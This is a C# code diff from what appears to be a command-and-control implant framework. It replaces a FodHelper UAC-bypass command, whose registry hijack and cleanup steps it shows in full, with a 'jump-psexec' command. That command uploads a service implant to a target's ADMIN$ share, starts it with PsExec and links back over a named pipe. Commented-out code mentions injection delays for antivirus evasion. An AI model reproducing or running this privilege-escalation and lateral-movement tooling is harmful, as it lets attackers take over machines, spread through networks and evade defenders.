@@ -5,45 +5,48 @@ using System.Text;
 using System.Threading.Tasks;
 using Common.AgentCommands.Composite;
 using Common.CommandLine.Core;
+using Common.Models;
 using Common.Payload;
 using Shared;
 
 namespace Common.AgentCommands.Custom
 {
-    public class ElevateCommandOptions : CommandOption
+    public class JumpPsExecCommandOptions : CommandOption
     {
-        [Option("k", "key", "Name of the key to use", DefaultValue = "c2s")]
-        public string key { get; set; }
-
+        [Argument("target", "Target where the service will be started", 0)]
+        public string Target { get; set; }
         [Option("v", "verbose", "Show details of the command execution.")]
         public bool verbose { get; set; }
 
-        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "elev8")]
+        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmp")]
         public string pipe { get; set; }
 
         [Option("f", "file", "FileName of payload.")]
         public string file { get; set; }
 
-        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "c:\\windows\\tasks")]
+        [Option("p", "path", "Name of the folder to upload the payload.", DefaultValue = "ADMIN$")]
         public string path { get; set; }
 
-       /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
-        public bool inject { get; set; }
+        [Option("s", "service", "Name of service.", DefaultValue = "syssvc")]
+        public string Service { get; set; }
 
-        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
-        public int injectDelay { get; set; }
+        /* [CommandOption("-i", "--inject", "If the payload should be an injector")]
+         public bool inject { get; set; }
 
-        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
-        public string injectProcess { get; set; }*/
+         [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
+         public int injectDelay { get; set; }
+
+         [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
+         public string injectProcess { get; set; }*/
 
         [Option("x86", "x86", "Generate a x86 architecture executable")]
         public bool x86 { get; set; }
     }
 
-    [Command("elevate", "UAC Bypass using FodHelper", Category = AgentCommandCategories.Composite)]
-    public class ElevateCommand : AgentCompositeCommand<ElevateCommandOptions>
+    [Command("jump-psexec", "Lateral Movement using psexec", Category = AgentCommandCategories.Composite)]
+    public class JumpPsExecCommand : AgentCompositeCommand<JumpPsExecCommandOptions>
     {
-        protected override async Task<bool> Run(AgentCommandContext context, ElevateCommandOptions options)
+        protected override async Task<bool> Run(AgentCommandContext context, JumpPsExecCommandOptions options)
         {
             var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
             var payloadOptions = new ImplantConfig()
@@ -53,7 +56,7 @@ namespace Common.AgentCommands.Custom
                 Endpoint = endpoint,
                 IsDebug = false,
                 IsVerbose = options.verbose,
-                Type = ImplantType.Executable,
+                Type = ImplantType.Service,
                 //InjectionDelay =  options.injectDelay,
                 //IsInjected = options.inject,
                 //InjectionProcess = options.injectProcess
@@ -81,39 +84,36 @@ namespace Common.AgentCommands.Custom
 
             string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
-
             context.Echo($"[>] Saving implant to {path}");
             context.Upload(Convert.FromBase64String(implant.Data), path);
             context.Delay(1);
 
-            context.Echo($"[>] Altering registry Keys");
-            context.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
-            context.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
-            context.Delay(10);
-            context.Echo($"[>] Starting fodhelper");
-            context.Shell("fodhelper");
-            context.Delay(10);
+            context.Echo($"[>] Executing PsExec");
+            context.PsExec(options.Target, path, options.Service);
 
-            context.Echo($"[>] Cleaning");
-            context.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
-            context.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
-            //if (!options.inject)
+            context.Delay(2);
+
+
+            //if (options.inject)
             //{
-                context.Echo($"[!] Don't forget to remove executable after use! : del {path}");
+            //    context.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
+            //    context.Delay(options.injectDelay + 10);
+
+            //    context.Echo($"Removing injector {path}");
+            //    context.Shell($"del {path}");
             //}
             //else
             //{
-            //    context.Echo($"Waiting {options.injectDelay}s to evade antivirus");
-            //    context.Delay(options.injectDelay + 10);
-            //    context.Echo($"Removing injector {path}");
-            //    context.DeleteFile(path);
+                context.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
             //}
-            context.Echo($"[>] Linking to {endpoint}");
-            var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
+
+            var targetEndPoint = ConnexionUrl.FromString($"pipe://{options.Target}:{options.pipe}");
+            context.Echo($"[>] Linking to {targetEndPoint}");
             context.Link(targetEndPoint);
-            context.Delay(2);
+
             context.Echo($"[*] Execution done!");
             context.Echo(Environment.NewLine);
+
 
             return true;
         }
